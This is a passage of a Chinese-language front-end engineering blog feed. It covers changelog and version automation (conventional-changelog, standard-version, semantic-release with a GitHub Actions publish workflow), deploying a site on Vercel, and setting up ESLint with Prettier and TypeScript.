xxxxxxx (tag: v1.0.1)</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">1.0.1</span><br><span class="line"></span><br><span class="line">commit xxxxxxx</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">fix: fix a bug</span><br><span class="line"></span><br><span class="line">commit xxxxxxx (tag: v1.0.0)</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">1.0.0</span><br><span class="line"></span><br><span class="line">commit xxxxxxx</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">feat: base function</span><br><span class="line"></span><br><span class="line">commit xxxxxxx</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">chore: first commit</span><br></pre></td></tr></table></figure><p><code>conventional-changelog</code> 读取到这样的 commit 历史后，就可以生成如下的 CHANGELOG：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## 1.0.1 (2022-xx-xx)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">### Bug Fixes</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">*</span> fix a bug</span><br><span class="line"></span><br><span class="line"><span class="section">### Features</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">*</span> add new fetaure 1</span><br><span class="line"><span class="bullet">*</span> add new fetaure 2</span><br><span class="line"></span><br><span class="line"><span class="section">## 1.0.1 (2022-xx-xx)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">### Bug Fixes</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">*</span> fix a bug</span><br><span class="line"></span><br><span class="line"><span class="section">## 1.0.0 (2022-xx-xx)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">### Features</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">*</span> base function</span><br></pre></td></tr></table></figure><p>如果你的 commit 符合以上两点要求，你可以安装 <code>conventional-changelog-cli</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install conventional-changelog-cli -D</span><br></pre></td></tr></table></figure><p>运行 cli 指令生成 CHANGELOG：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx conventional-changelog -p angular -i CHANGELOG.md -s -r 0</span><br></pre></td></tr></table></figure><p>之后版本变更后想生成新的 CHANGELOG 就只需要再执行一遍上面的指令即可。但是还有一种更简便的方式，就是使用 npm 的 <code>version</code> 钩子来在更新版本号时候自动触发 CHANGELOG 生成，只需要在 <code>package.json</code> 中添加以下 script：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;conventional-changelog -p angular -i CHANGELOG.md -s &amp;&amp; git add CHANGELOG.md&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>添加之后，在我们执行 <code>npm version</code> 时，一旦版本号变更成功就会触发 <code>version</code> script 生成 CHANGELOG，并将生成的 <code>CHANGELOG.md</code> 添加到暂存区，然后 <code>npm version</code> 继续执行，暂存区的代码进行提交，并创建一个 tag。</p><p><strong>总之，将所有的流程配置好之后，完整的工作流如下：</strong></p><ol><li>编辑代码，添加新功能或者修复 bug；</li><li>完成某个功能后进行 commit，commit 要符合<a href="https://github.com/angular/angular.js/blob/master/DEVELOPERS.md#-git-commit-guidelines">Angular 的提交规范</a>；</li><li>继续完成其他的功能，并每完成一个功能后及时提交标准化的 commit，直到你想要发版为止；</li><li>执行 <code>npm version xxx</code> 生成新的版本号，这时 CHANGELOG 和版本号都会自动进行迭代；</li><li>执行 <code>npm publish --access public</code> 进行版本发布。</li></ol><h1 id="2-standard-version"><a href="#2-standard-version" class="headerlink" title="2. standard-version"></a>2. standard-version</h1><p><a href="https://github.com/conventional-changelog/standard-version">standard-version</a> 是 conventional-changelog 推荐使用的标准化 npm 版本生成工具，它可以取代 <code>npm version</code> 指令，并提供更简便、语义化的调用方式；</p><p>同时，它也集成了 conventional-chagelog，在生成版本号时会自动创建 CHANGELOG，可以省去我们自己配置 conventional-chagelog-cli 的过程；</p><p>此外它还提供了配置文件，你可以很方便的自定义 CHANGELOG 的输出。</p><h2 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h2><p>standard-version 可以安装到全局来替代 <code>npm version</code> 指令，但最好还是安装到本地项目中，方便其他开发人员使用，可以用 <code>npx</code> 指令来执行它：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install standard-version -D</span><br></pre></td></tr></table></figure><h2 id="2-2-使用"><a href="#2-2-使用" class="headerlink" title="2.2 使用"></a>2.2 使用</h2><p>使用 standard-version 的前提还是要有标准化的 commit 链，就像上面我们在 CHANGELOG 生成中所描述的那样。当你完成了一系列的代码变更后，就可以执行 <code>npx standard-version</code> 来生成一个版本（如果是首次发布则需要执行 <code>npx standard-version --first-release</code>），执行之后 standard-version 会做如下的事情：</p><ol><li>读取 <code>package.json</code> 查询当前包的版本号，如果没有查询到，就将最后一个 tag 的版本号视作当前的版本号；</li><li>依据你的 commit 信息，来决定下一个版本号（这一过程被称为 <code>bump version</code>），然后修改 <code>package.json</code>、<code>package-lock.json</code> 等需要迭代版本号的文件中的版本号字段；</li><li>依据你的 commit 信息生成或更新 <code>CHANGELOG.md</code> 文件；</li><li>使用新的版本号为名称，创建一个 tag 进行留档。</li></ol><p>在使用 <code>npx standard-version</code> 来迭代版本时，你无需关心是迭代 major、minor、patch 位的版本号，<code>standard-version</code> 会自动根据你的版本号来决定下一个版本号需要迭代哪一位，比如：当发现自上次版本号生成以来，提交的代码中的 commmit message 中仅有 <code>fix</code> 类型的提交，那么就只会迭代 patch 位的版本号；但如果发现自上次生成版本号以来，携带有 <code>feat</code> 类型的提交，那么就会去迭代 minor 位的版本号。</p><p>当然你也可以强行指定升级哪一位版本号，比如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npx standard-version --release-as minor</span><br><span class="line">npx standard-version --release-as patch</span><br><span class="line">npx standard-version --release-as major</span><br></pre></td></tr></table></figure><p>亦或是你想要迭代版本号为 prerelease 版本，那么就要使用下面的指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx standard-version --prerelease alpha</span><br></pre></td></tr></table></figure><h1 id="3-semantic-release"><a href="#3-semantic-release" class="headerlink" title="3. semantic-release"></a>3. semantic-release</h1><p>目前 standard-version 这个项目已经被标记为 deprecated，意味着后续不再维护，同时也意味着这种模式下的包管理方式正在逐渐『落后』。standard-version 在官方文档中也指明了两条出路，如果你是 github 用户的话，作者推荐使用 <a href="https://github.com/googleapis/release-please">release-please</a> 进行代替；同时，作者也在文中提到了 <a href="https://github.com/semantic-release/semantic-release">semantic-release</a>，它也是一个语义化的 npm 包版本管理方案。</p><p>不论是 release-please 还是 semantic-release 也好，他们都解决了 standard-version 的一个痛点，<strong>那就是 standard-version 的工作流基于本地</strong>，开发人员需要本地进行版本迭代、npm 发布的行为。但是由于 CICD 的流行，似乎在 CI 上进行 npm 包的版本迭代与发布更为合适，这样就不会造成多个开发人员并行开发时版本冲突的问题了。<strong>release-please 与 semantic-release 的目的都是将人为干预的版本迭代和发包行为，转移到标准化的、可持续的 CI 平台上完成</strong>。</p><blockquote><p>机器永远比人类靠谱</p></blockquote><p><img src="https://github.com/semantic-release/semantic-release/raw/master/media/bender.png" alt=""></p><p>鉴于 semantic-release 比 release-please 得到的关注更多，因此我们重点探讨 semantic-release。</p><h2 id="3-1-安装与使用"><a href="#3-1-安装与使用" class="headerlink" title="3.1 安装与使用"></a>3.1 安装与使用</h2><p>semantic-release 也提供了 cli 工具，可以快速的帮你完成安装和配置工作，以 Github 为例，你只需要进入到你的项目目录下，输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx semantic-release-cli setup</span><br></pre></td></tr></table></figure><p>交互式命令行就会询问你的 NPM 账号、密码、二步验证，从而获取你的 NPM token（用于在流水线发包）；之后会引导你进行 Github 授权，目的是为了在你的目标项目的 <a href="https://docs.github.com/cn/actions/security-guides/encrypted-secrets">Secrets</a> 中写入 <code>NPM_TOKEN</code> 的环境变量。</p><p>之后你就可以创建你的 Github Action 来轻松的进行发包，发布的 yml 文件示例如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Publish</span> <span class="string">package</span> <span class="string">to</span> <span class="string">NPM</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">pnpm</span> <span class="string">env</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">pnpm/action-setup@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">version:</span> <span class="number">6.32</span><span class="number">.16</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">node</span> <span class="string">env</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="number">14</span></span><br><span class="line">          <span class="attr">cache:</span> <span class="string">&#x27;pnpm&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">node_modules</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">pnpm</span> <span class="string">install</span> <span class="string">--frozen-lockfile</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">module</span></span><br><span class="line">        <span class="comment"># 进行包构建</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">pnpm</span> <span class="string">build</span></span><br><span class="line">        </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">publish</span> <span class="string">script</span></span><br><span class="line">        <span class="comment"># 进行包发布</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">pnpm</span> <span class="string">release</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">NPM_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.NPM_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>这样，当你的代码向 master 分支合入后，就会自动触发 npm 的发布行为，自动生成 tag、以及你 Github 项目的 Release。</p><p>值得注意的是，semantic-release 在初始化好之后就将你 <code>package.json</code> 中的版本号重置为 <code>0.0.0-development</code>，并且在后续的迭代中，这个版本号都不会有任何改变。这是因为 semantic-release 确定版本号的方法是从 tag 列表中获取最新的版本号，而并非是从 <code>packageFiles</code> 中获取版本号。这样的好处就是版本号不跟代码中的任何文件进行强关联，那么在 CI 迭代版本时也不会去修改源代码，造成 CI push 代码的行为。</p><h2 id="3-2-手动配置"><a href="#3-2-手动配置" class="headerlink" title="3.2 手动配置"></a>3.2 手动配置</h2><p>上面我们讨论了使用 <code>semantic-release-cli</code> 快速接入 Github 项目的方案，但是再实际的生产环境下是非常复杂的，也许你使用的是 GitLab 亦或是其他平台，那么这时候往往需要我们手动进行配置。</p><p>首先我们需要在项目中安装 <code>semantic-release</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install semantic-release -D</span><br></pre></td></tr></table></figure><p>之后我们就可以使用 <code>npx semantic-release</code> 指令进行版本发布了，但是在此之前不得不提一下，semantic-release 大部分功能是由插件实现的，比如 npm 发包是由 @semantic-release/npm 插件实现的，在默认情况下 semantic-release 自动开启四个插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;@semantic-release/commit-analyzer&quot;</span><br><span class="line">&quot;@semantic-release/release-notes-generator&quot;</span><br><span class="line">&quot;@semantic-release/npm&quot;</span><br><span class="line">&quot;@semantic-release/github&quot;</span><br></pre></td></tr></table></figure><p>当你使用 <code>npx semantic-release</code> 指令时 semantic-release 会经过多个阶段，在每个阶段的执行过程中 semantic-release 会做一些事情，比如生成 tag、推送tag、编写 git notes 等，同时 semantic-release 的插件也会被触发，从而来『插手』做一些事情。在默认的情况下，<code>npx semantic-release</code> 会执行以下流程：</p><ol><li>加载配置，确定哪些插件被启用；</li><li>加载插件；</li><li>执行 <code>verifyConditions</code> 阶段，这一阶段负责<strong>校验用户当前的环境权限</strong>。比如 @semantic-release/npm 插件会检查是否有 .npmrc 配置以及是否有 npm token、@semantic-release/github 插件会检查当前环境是否有资格推送代码以及分支；</li><li>执行 <code>analyzeCommits</code> 阶段，这一阶段负责<strong>确定下一个版本是什么版本</strong>。比如 @semantic-release/commit-analyzer 在这一阶段会根据标准化的 commit 中来判断下一个版本是 major、minor 或 patch ；</li><li>执行 <code>verifyRelease</code> 阶段，这一阶段负责<strong>验证即将发布的版本的参数</strong>（版本、类型、dist-tag 等）；</li><li>执行 <code>generateNotes</code> 阶段，这一阶段负责<strong>生成发布说明的内容</strong>；</li><li>执行 <code>prepare</code> 阶段，这一阶段<strong>负责准备发布，例如创建或更新文件</strong>，比如 <code>package.json</code> 中的版本号修改、tag 的生成就是在这一阶段发生的；</li><li>执行 <code>publish</code> 阶段，这一阶段<strong>负责执行发布相关的指令</strong>，@semantic-release/npm 就会在此发布 package，@semantic-release/github 会在此生成对应的 release；</li><li>执行 <code>addChannel</code> 阶段，这一阶段<strong>负责添加发布渠道</strong>，这里主要是让 @semantic-release/npm 调用 <a href="https://docs.npmjs.com/cli/dist-tag/">npm dist-tag</a> 指令来为刚刚发布的包标记 <code>@latest</code> 或 <code>@beta</code> 等标签；</li><li>执行 <code>success</code> 阶段，负责通知新版本；</li><li>执行 <code>fail</code> 阶段，负责通知发布失败。</li></ol><p>如果你想要添加更多的插件，可以参考<a href="https://semantic-release.gitbook.io/semantic-release/usage/plugins">这一章节</a>。</p><h2 id="3-3-注意事项"><a href="#3-3-注意事项" class="headerlink" title="3.3 注意事项"></a>3.3 注意事项</h2><p>需要注意的是，semantic-release 理论上是可以支持所有的 CI 与 Git 托管平台的，但是需要注意一点就是你的 Git 托管平台必须能支持 CI 往上面有权限推送 tag 以及 git notes。</p><p>比如在使用 <a href="https://www.gerritcodereview.com/">Gerrit Code Review</a> 规范的平台上，推送代码仅支持 <code>git push origin HEAD:refs/for/xxx</code> 就造成无法推送 <code>refs/note/semantic</code>，那么 semantic-release 就会在 <code>publish</code> 阶段崩溃，导致后面的流程无法继续。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
            <tag> cicd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Vercel 全自动部署个人网站</title>
      <link href="/2022/07/0cce6064286a.html"/>
      <url>/2022/07/0cce6064286a.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-什么是-Vercel"><a href="#1-什么是-Vercel" class="headerlink" title="1. 什么是 Vercel"></a>1. 什么是 Vercel</h1><p>Vercel 是一个全自动的 Web 应用部署、预览、上线平台。他类似与 Github Page 与 Github Action 的结合，但是与其有如下几个特性：</p><ul><li>支持应用模板，可以帮助开发人员快速搭建一个应用并完成上线流程；</li><li>支持 Github 项目导入与联动；</li><li>Github Action 是 CICD 流水线，而 Vercel 只专注于项目部署（静态托管），以及提供 <a href="https://vercel.com/docs/concepts/functions/serverless-functions">Serverless Function</a>，其他的事情，比如 npm 自动发包、持续集成测试，不是 Vercel 的业务范围；</li><li>支持零配置部署到全球的边缘网络，访问速度比 Github Page 快得多，无需关心 CDN、HTTPS，Vercel 会帮你做好这一切；</li><li>Vercel 可以部署多种环境，出了项目主要的生产环境之外，它可以将你的其他分支视为预览分支进行部署（当然这些预览环境会加上对应的响应头防止被搜索引擎收录）</li></ul><h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h1><p>这里我们用 <a href="https://github.com/EsunR/Blog-Index">EsunR/Blog-Index</a> 项目做示例，使用 Vercel 对其进行部署。</p><h2 id="2-1-创建-Github-仓库"><a href="#2-1-创建-Github-仓库" class="headerlink" title="2.1 创建 Github 仓库"></a>2.1 创建 Github 仓库</h2><p>首先，点击项目的 Fork 按钮，将项目同步到自己的 Github 仓库中：</p><p><img src="https://s2.loli.net/2022/07/11/etzGPTsFjDpxwmK.png" alt=""></p><p>然后将该仓库 clone 到本地，按项目说明，进行装包、修改配置文件、调试等一系列工作后，将变更提交，并推送到该仓库。</p><h2 id="2-2-Vercel-平台接入"><a href="#2-2-Vercel-平台接入" class="headerlink" title="2.2 Vercel 平台接入"></a>2.2 Vercel 平台接入</h2><p>登入 <a href="https://vercel.com/login">Vercel 官网</a> 完成账号注册，进入到工作台后，授权你的 Github 仓库权限给 Vercel：</p><p><img src="https://s2.loli.net/2022/07/11/VUmDLCS91YqFe3d.png" alt=""></p><p>授权完成后导入项目：</p><p><img src="https://s2.loli.net/2022/07/11/A2NcE8XJiUbYfT3.png" alt=""></p><p>对项目进行配置，并手动调整构建语句配置：</p><p><img src="https://s2.loli.net/2022/07/11/pJUD3hMkXmSBYFv.png" alt=""></p><p>完成后点击 <code>Deploy</code> 即可开始部署，完成后便可前往项目控制台查看 Vercel 为你分配的域名了：</p><blockquote><p>注意：Vercel 默认分配的域名 <code>*.vercel.app</code> <a href="https://github.com/orgs/vercel/discussions/803">已经被大陆封禁</a>，新的项目如果要访问则必须按下面的步骤绑定自己的域名，如果仍无法访问，则需要在绑定域名时将 CNAME 设置为 <code>cname-china.vercel-dns.com.</code></p></blockquote><p><img src="https://s2.loli.net/2022/07/11/BW91HG3pF7lUCcL.png" alt=""></p><p>在项目设置中绑定自己的域名：</p><p><img src="https://s2.loli.net/2022/07/11/HV2dbZUJtchgOK9.png" alt=""></p><p>后续你只需要修改你仓库中 Fork 下的代码即可，推送到 github 上时便会自动触发 Vercel 的重新部署流程。</p><p>如果你想切换默认部署的分支，可以将 Production Branch 设置为别的分支即可：</p><p><img src="https://s2.loli.net/2022/07/11/DszltROMCBhI6bH.png" alt=""></p><h2 id="2-3-同步更新"><a href="#2-3-同步更新" class="headerlink" title="2.3 同步更新"></a>2.3 同步更新</h2><p>如果你想要同步项目作者的更新，可以使用 Github 的 Sync fork 功能。</p><p>进入到你 Fork 的项目仓库，点击 <code>Sync fork</code> 按钮后确认 <code>Update branch</code>：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202311031547649.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cicd </tag>
            
            <tag> 前端工程化 </tag>
            
            <tag> Vercel </tag>
            
            <tag> 自动部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端 Lint 工具使用指南</title>
      <link href="/2022/07/72bea7fe8c23.html"/>
      <url>/2022/07/72bea7fe8c23.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-ESLint"><a href="#1-ESLint" class="headerlink" title="1. ESLint"></a>1. ESLint</h1><p><a href="https://eslint.org/">官网</a></p><p>ESLint 可以静态分析你的代码，得以让你快速发现代码中的错误部分。它内置于大多数文本编辑器中，你还可以将 ESLint 作为持续集成管道的一部分，在持续集成的过程中帮你检查代码。</p><h2 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h2><blockquote><p>如果你使用 VSCode，记得安装 ESLint 插件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install eslint --save-dev</span><br></pre></td></tr></table></figure><h2 id="1-2-使用-Eslint-推荐配置"><a href="#1-2-使用-Eslint-推荐配置" class="headerlink" title="1.2 使用 Eslint 推荐配置"></a>1.2 使用 Eslint 推荐配置</h2><p> ESLint 内置了一个推荐的规则集 <code>eslint:recommended</code> ，你可以按照如下配置开启，首先，创建 <code>.eslintrc.js</code> :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="string">&quot;extends&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;eslint:recommended&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;parserOptions&quot;</span>: &#123;</span><br><span class="line">    <span class="comment">// ECMAScript 语言版本，默认为 5</span></span><br><span class="line">        <span class="string">&quot;ecmaVersion&quot;</span>: <span class="number">2018</span>,</span><br><span class="line">        <span class="comment">// 模块引用类型，默认为 script，如果使用 ESModule，设置为 module</span></span><br><span class="line">        <span class="string">&quot;sourceType&quot;</span>: <span class="string">&quot;module&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://eslint.org/docs/rules/">配置规则详情</a>(只有规则列表中标有 ✅  的才是 <code>eslint:recommended</code> 规则集中启用的)</p><h2 id="1-3-与-Prettier-一起使用"><a href="#1-3-与-Prettier-一起使用" class="headerlink" title="1.3 与 Prettier 一起使用"></a>1.3 与 Prettier 一起使用</h2><p>prettier 相关的规则 npm 包有两款，一款是 <a href="https://github.com/prettier/eslint-config-prettier">eslint-config-prettier</a>，另外一款是 <a href="https://github.com/prettier/eslint-plugin-prettier#readme">eslint-plugin-prettier</a>，这两款 npm 包的区别如下：</p><p><code>eslint-config-prettier</code> 只是一个规则集，仅作为 <code>extends</code> 使用，他仅仅是禁用了一些第三方规则中与 prettier 冲突的部分，但它本身并不提供 eslint 的校验，<strong>因此你需要将其搭配其他 eslint 规则插件使用</strong>，并作为 <code>extends</code> 的最后一项使用用以覆盖那些其他插件规则中与 prettier 相冲的部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="string">&quot;extends&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;eslint:recommended&quot;</span>,</span><br><span class="line">        <span class="string">&quot;eslint-config-prettier&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;parserOptions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;ecmaVersion&quot;</span>: <span class="number">2018</span>,</span><br><span class="line">        <span class="string">&quot;sourceType&quot;</span>: <span class="string">&quot;module&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eslint-plugin-prettier</code> 是一个插件，它将 prettier 的规则作为 eslint 规则使用，当你的代码中出现不符合 prettier 规范的代码时，会触发 eslint 的报错警告，参考配置如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">plugins</span>: [<span class="string">&quot;prettier&quot;</span>],</span><br><span class="line">    <span class="attr">parserOptions</span>: &#123;</span><br><span class="line">        <span class="attr">ecmaVersion</span>: <span class="number">2018</span>,</span><br><span class="line">        <span class="attr">sourceType</span>: <span class="string">&quot;module&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">rules</span>: &#123;</span><br><span class="line">        <span class="string">&quot;prettier/prettier&quot;</span>: <span class="string">&quot;error&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最好的做法是将 <code>eslint-config-prettier</code> 和 <code>eslint-plugin-prettier</code> 共同使用，前者会消除掉 eslint 中对格式的校验部分，后者可以将 prettier 的设置作为代码的格式校验规则并应用到 eslint 中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">extends</span>: [<span class="string">&quot;prettier&quot;</span>],</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="string">&quot;prettier&quot;</span>],</span><br><span class="line">  <span class="attr">parserOptions</span>: &#123;</span><br><span class="line">    <span class="attr">ecmaVersion</span>: <span class="number">2018</span>,</span><br><span class="line">    <span class="attr">sourceType</span>: <span class="string">&quot;module&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">rules</span>: &#123;</span><br><span class="line">    <span class="string">&quot;prettier/prettier&quot;</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arrow-body-style&quot;</span>: <span class="string">&quot;off&quot;</span>,</span><br><span class="line">    <span class="string">&quot;prefer-arrow-callback&quot;</span>: <span class="string">&quot;off&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>关闭 arrow-body-stlye 和 prefer-arrow-callback 的规则，否则会 <a href="https://github.com/prettier/eslint-plugin-prettier#arrow-body-style-and-prefer-arrow-callback-issue">出问题</a></p></blockquote><h2 id="1-4-与-Typescript-集成"><a href="#1-4-与-Typescript-集成" class="headerlink" title="1.4 与 Typescript 集成"></a>1.4 与 Typescript 集成</h2><p>如果你的项目是 typescript 搭建的，那么你需要一份 typescript 的规则集以及 parser，推荐使用 <code>@typescript-eslint/parser</code> 与 <code>@typescript-eslint/eslint-plugin</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add --dev @typescript-eslint/parser @typescript-eslint/eslint-plugin</span><br></pre></td></tr></table></figure><p>.eslintrc.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 